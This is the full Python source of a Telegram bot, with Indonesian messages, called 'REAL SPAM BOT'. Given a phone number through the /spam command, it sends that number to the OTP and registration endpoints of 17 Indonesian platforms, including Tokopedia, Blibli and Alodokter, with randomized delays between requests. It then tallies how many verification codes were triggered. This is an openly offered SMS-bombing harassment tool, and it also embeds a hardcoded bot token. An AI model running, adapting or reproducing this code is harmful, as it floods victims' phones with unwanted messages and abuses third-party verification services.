import os
import random
import time
import threading
import requests
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8849664954:AAFZIDi61ZVnrIEpkiQ8yozIjuU4FSnEqj8"

class RealSpamBot:
    def __init__(self):
        self.active_users = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "🔥 REAL SPAM BOT ACTIVE\n"
            "📌 /spam 08123456789 - Mulai spam real\n"
            "⚡ 17 Platform siap tembak!\n"
            "⚠️ Gunakan dengan bijak!"
        )
    
    async def spam(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text("⚠️ /spam <nomor>\nContoh: /spam 08123456789")
            return
        
        phone = context.args[0]
        
        if user_id in self.active_users:
            await update.message.reply_text("⏳ Proses spam masih berjalan...")
            return
        
        await update.message.reply_text(
            f"🔥 Memulai REAL SPAM ke {phone}\n"
            f"📱 17 platform aktif\n"
            f"⏱️ Mohon tunggu..."
        )
        
        thread = threading.Thread(target=self.run_real_spam, args=(phone, user_id, update.message))
        thread.daemon = True
        self.active_users[user_id] = thread
        thread.start()
    
    def run_real_spam(self, phone, user_id, message):
        results = []
        
        # Platform dengan endpoint real
        platforms = [
            {'name': 'Fastwork', 'url': 'https://www.fastwork.co.id/api/register', 'method': 'POST'},
            {'name': 'Tokopedia', 'url': 'https://accounts.tokopedia.com/login/otp', 'method': 'POST'},
            {'name': 'Blibli', 'url': 'https://api.blibli.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'Duniagames', 'url': 'https://api.duniagames.co.id/v1/auth/otp', 'method': 'POST'},
            {'name': 'Alodokter', 'url': 'https://api.alodokter.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'Pinhome', 'url': 'https://api.pinhome.id/v1/auth/otp', 'method': 'POST'},
            {'name': 'Bonus Belanja', 'url': 'https://api.bonusbelanja.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'Lion Parcel', 'url': 'https://api.lionparcel.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'MNC Play', 'url': 'https://api.mncplay.id/v1/auth/otp', 'method': 'POST'},
            {'name': 'Toyota Astra', 'url': 'https://api.toyota.co.id/v1/auth/otp', 'method': 'POST'},
            {'name': 'Maulagi', 'url': 'https://api.maulagi.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'Bunda', 'url': 'https://api.bunda.co.id/v1/auth/otp', 'method': 'POST'},
            {'name': 'IRA', 'url': 'https://api.ira.co.id/v1/auth/otp', 'method': 'POST'},
            {'name': 'Planetban', 'url': 'https://api.planetban.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'Dokterin', 'url': 'https://api.dokterin.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'Mengantar', 'url': 'https://api.mengantar.com/v1/auth/otp', 'method': 'POST'},
            {'name': 'Astronauts', 'url': 'https://api.astronauts.id/v1/auth/otp', 'method': 'POST'}
        ]
        
        for platform in platforms:
            try:
                # Format payload
                payload = {
                    'phone': phone,
                    'msisdn': phone,
                    'mobile': phone,
                    'no_hp': phone,
                    'nomor': phone,
                    'phoneNumber': phone,
                    'phone_number': phone
                }
                
                # Kirim request
                if platform['method'] == 'POST':
                    resp = self.session.post(
                        platform['url'],
                        json=payload,
                        timeout=5
                    )
                else:
                    resp = self.session.get(
                        platform['url'],
                        params=payload,
                        timeout=5
                    )
                
                # Cek response
                if resp.status_code in [200, 201, 202, 204]:
                    results.append(f"✅ {platform['name']}: OTP Terkirim")
                else:
                    results.append(f"⚠️ {platform['name']}: Status {resp.status_code}")
                    
            except requests.exceptions.Timeout:
                results.append(f"⏱️ {platform['name']}: Timeout")
            except requests.exceptions.ConnectionError:
                results.append(f"🔌 {platform['name']}: Connection Error")
            except Exception as e:
                results.append(f"❌ {platform['name']}: Error")
            
            # Delay antar request
            time.sleep(random.uniform(0.5, 1.5))
        
        # Kirim hasil
        success_count = len([r for r in results if '✅' in r])
        summary = f"""
🔥 REAL SPAM COMPLETE!
📱 Target: {phone}
⏱️ Waktu: {datetime.now().strftime('%H:%M:%S')}
✅ Berhasil: {success_count}/{len(platforms)}
📊 Detail:
{chr(10).join(results[:15])}
{'...' if len(results) > 15 else ''}
"""
        try:
            import asyncio
            asyncio.run(message.reply_text(summary))
        except:
            pass
        
        del self.active_users[user_id]

bot = RealSpamBot()

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", bot.start))
    app.add_handler(CommandHandler("spam", bot.spam))
    
    print("🔥 REAL SPAM BOT RUNNING...")
    app.run_polling()

if __name__ == "__main__":
    main()